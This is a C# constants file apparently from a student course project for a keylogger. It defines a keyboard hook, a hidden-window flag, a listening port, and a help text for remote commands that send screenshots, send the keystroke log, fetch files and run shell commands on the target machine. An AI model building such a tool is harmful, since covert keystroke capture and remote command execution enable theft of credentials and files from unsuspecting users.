namespace ConstantsLib
{
    public static class Constants
    {
        #region net constants
        public static int ListenPort = 7788;

        public static int ACK_OK = 0;
        public static int ACK_ERROR = 13;
        #endregion

        #region other constants
        public static string ScreenshotPath = @"\screen.jpg";
        public static string LogPath = @"\log.dat";

        public static int SW_HIDE = 0;
        public static int BUFSIZ = 1024 * 1024;//1024*5000
        #endregion

        #region keyboard constants
        public static int WH_KEYBOARD_LL = 13;
        public static int WM_KEYDOWN = 0x0100;
        public static int WM_KEYUP = 0x0101;
        public static int WM_SYSKEYDOWN = 0x0104;
        public static int WM_SYSKEYUP = 0x0105;

        public static int KF_REPEAT = 0X40000000;

        public static int HKL_NEXT = 1;

        public static int VK_SHIFT = 0x10;  // SHIFT
        public static int VK_CONTROL = 0x11;    // CONTROL
        public static int VK_MENU = 0x12; // ALT
        public static int VK_CAPITAL = 0x14; // CAPS LOCK

        public const string USALang = "США";
        public const string RuLang = "Русская";
        #endregion

        #region reply constants
        public static string HelpReply = @"
                                Cmd syntax: <cmd> <params> <Enter>
                                Embedded Cmd list:
                                    screen - takes screenshot and send to client
                                    log - send log file to client
                                    load path_to_file_without_quotes - load file from server. Dont use quotes even in case of spaces consisting pathes
                                    help - show this message
                                    cmd <cmd_name> <cmd_arg>* - execute command <cmd_name> on server machine using command shell and reply standart output 
                                E.g.: 
                                    cmd taskkill /IM notepad.exe /f
                                    cmd dir
                                    load D:\! 4 сем\KSIS\course\keylogger\client\bin\Debug\log.dat
                                    cmd ipconfig /all
                                    cmd notepad.exe
                                    cmd del path_to_file";
        public static string NoCmdProcessReply = "\tCommand process had no reply.\t";
        public static string UnderscoreLine = "___________________________________________________________________________________\r\n";
        #endregion
    }

}
